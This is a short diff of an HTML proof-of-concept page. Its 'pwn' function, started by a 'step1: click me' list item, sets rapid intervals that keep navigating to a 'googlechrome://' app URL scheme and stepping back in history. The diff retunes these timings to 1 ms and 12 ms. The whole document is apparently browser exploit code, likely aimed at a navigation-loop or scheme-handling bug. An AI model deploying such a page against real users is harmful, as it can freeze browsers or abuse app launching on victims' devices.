@@ -2,7 +2,8 @@
 	<script>
 	    function pwn() {
 		    alert();
-	        v = setInterval(`x=document.location='googlechrome://about:about';window.history.go(-1);`, 1);
+	           setInterval(`x=document.location='googlechrome://about:about';`, 1);
+		    setInterval(`window.history.go(-1);`, 12);
 	    }
 	</script>
 	<li onclick="pwn();">step1: click me</li>
